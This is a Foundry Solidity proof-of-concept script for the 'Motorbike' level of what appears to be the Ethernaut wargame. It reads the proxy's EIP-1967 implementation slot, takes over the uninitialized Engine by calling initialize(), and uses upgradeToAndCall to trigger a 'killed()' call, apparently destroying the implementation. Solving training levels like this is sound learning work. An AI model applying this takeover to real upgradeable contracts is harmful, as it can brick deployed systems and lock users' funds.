// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel25.sol";

contract POC is Script {

     Motorbike level25 = Motorbike(0xEf786A0B0032f5cf2c605B5be178964e8219B7E2);
     Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
    function run() external{
        vm.startBroadcast();

        engineAddress.initialize();
        console.log("Upgrader is :", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(0xB9Db029072E0077235736dB1EC9b6D177Fa7d604, encodedData);

        vm.stopBroadcast();
    }
}

